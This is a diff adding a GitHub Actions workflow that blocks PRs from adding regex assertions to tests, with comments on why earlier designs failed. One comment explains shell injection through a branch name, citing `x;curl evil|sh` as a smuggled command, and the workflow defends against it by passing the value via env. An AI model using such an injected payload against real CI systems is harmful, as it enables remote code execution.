@@ -1,0 +1,89 @@
+# THIS PR MAY NOT ADD A REGEX ASSERTION TO A TEST.
+#
+# Operator, 2026-08-26: "Regex is forbidden for being brittle."
+#
+#   expect(t.title).not.toMatch(/invitation sent/i)
+#
+# Brittle in BOTH directions, and the second is the dangerous one:
+#   - reword the COPY            -> a correct implementation starts failing;
+#   - reword the FAILURE message -> the assertion stops matching and PASSES,
+#                                   while the code still misbehaves.
+#
+# WHY THE DIFF AND NOT A COUNT — two earlier designs of this gate were wrong.
+#
+# The first compared a total against a committed baseline. The scan walks
+# SUBMODULE trees, which move whenever a gitlink advances, so the number changed
+# for reasons unrelated to the PR. It fired twice on its own PR, in opposite
+# directions, both times because `development` had advanced underneath it.
+#
+# The second compared the merge-base with the head. It could not even run: a
+# historical gitlink routinely names a submodule commit that no longer exists on
+# the remote, and `git submodule update` fails with "not our ref".
+#
+# The question was never "how many are there in the estate". It is "did THIS
+# change add one". The diff answers that directly, needs no checkout, and cannot
+# drift. A gate that blames a PR for something it did not do is worse than no
+# gate — it teaches people to merge past it.
+#
+# The replacement for a flagged assertion is not to delete it. Assert the OUTCOME
+# instead of the wording: return a named outcome from a pure function, map outcome
+# to copy in a table, assert which outcome was chosen. Measured on crm7#2019 that
+# rewrite was strictly STRONGER — 5 of 9 mutations caught, against 3 of 6.
+# THE BACKLOG IS STILL WORTH SEEING, it is just not what this gate asserts:
+#
+#   node scripts/scan-regex-assertions.mjs           # per-app counts
+#   node scripts/scan-regex-assertions.mjs --json    # with the offending files
+#
+# 679 across 1042 test files as of 2026-08-26 (crm7 363, BSU 162, conduit 83,
+# throughput 45, braden 26, R80.4 0). That script is a REPORT, deliberately not a
+# gate — it is the thing whose drift made the first two designs unusable.
+name: Regex assertion ratchet
+
+on:
+  pull_request:
+    branches: [main, development]
+  workflow_dispatch:
+
+jobs:
+  no-new-regex:
+    name: No new regex assertions in tests
+    runs-on: ubuntu-latest
+    steps:
+      # No submodules: the diff is a parent-repo artefact, and submodule content
+      # is irrelevant to "what did this PR add". Not fetching them also removes
+      # the failure mode that killed the previous design.
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '24'
+
+      # Watched to catch a planted defect AND watched not to flag prose that
+      # quotes one. Both, or it cannot tell found-nothing from checked-nothing.
+      - name: Self-test the checker
+        run: node scripts/__tests__/check-added-regex-assertions.test.mjs
+
+      - name: Check what this PR adds
+        shell: bash
+        # `github.base_ref` is a BRANCH NAME, and a branch name is attacker-supplied.
+        # Interpolated with ${{ }} it is pasted into the shell before bash ever sees
+        # it, so a branch called `x;curl evil|sh` executes. Passed through `env:` it
+        # arrives as a plain variable and `"$BASE_REF"` is inert.
+        # Flagged by semgrep `run-shell-injection` (ERROR) on this file's line 70.
+        env:
+          BASE_REF: ${{ github.base_ref }}
+        run: |
+          set -euo pipefail
+          git fetch -q origin "$BASE_REF"
+          base=$(git merge-base HEAD "origin/$BASE_REF")
+          echo "diffing $base..HEAD"
+          # An empty diff is a real answer here (a submodule-pointer-only PR), so
+          # it passes — but say so, rather than letting silence read as a check.
+          if git diff --unified=0 "$base"..HEAD -- '*.test.ts' '*.test.tsx' '*.spec.ts' '*.spec.tsx' | grep -q .; then
+            git diff --unified=0 "$base"..HEAD -- '*.test.ts' '*.test.tsx' '*.spec.ts' '*.spec.tsx' \
+              | node scripts/check-added-regex-assertions.mjs
+          else
+            echo "this PR touches no test files — nothing to check"
+          fi
